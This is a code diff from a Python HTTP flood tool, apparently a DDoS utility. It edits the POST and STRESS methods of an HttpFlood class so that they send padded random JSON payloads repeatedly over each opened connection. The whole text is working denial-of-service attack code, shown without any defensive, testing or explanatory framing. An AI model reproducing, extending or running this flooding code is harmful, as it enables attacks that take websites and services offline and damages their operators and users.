@@ -329,7 +329,7 @@ class HttpFlood:
             else "REQUESTS"
 
     def POST(self) -> None:
-        payload: bytes = self.generate_payload((f"Content-Length: {44}\r\n"
+        payload: bytes = self.generate_payload(("Content-Length: 44\r\n"
                                                 "X-Requested-With: XMLHttpRequest\r\n"
                                                 "Content-Type: application/json\r\n\r\n"
                                                 '{"data": %s}'
@@ -342,8 +342,11 @@ class HttpFlood:
             s.close()
 
     def STRESS(self) -> None:
-        payload: bytes = self.generate_payload((f"Cookie: %s=%s" % (ProxyTools.Random.rand_str(12),
-                                                                    ProxyTools.Random.rand_str(316))))
+        payload: bytes = self.generate_payload((f"Content-Length: 524\r\n"
+                                                "X-Requested-With: XMLHttpRequest\r\n"
+                                                "Content-Type: application/json\r\n\r\n"
+                                                '{"data": %s}'
+                                                ) % ProxyTools.Random.rand_str(512))[:-2]
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
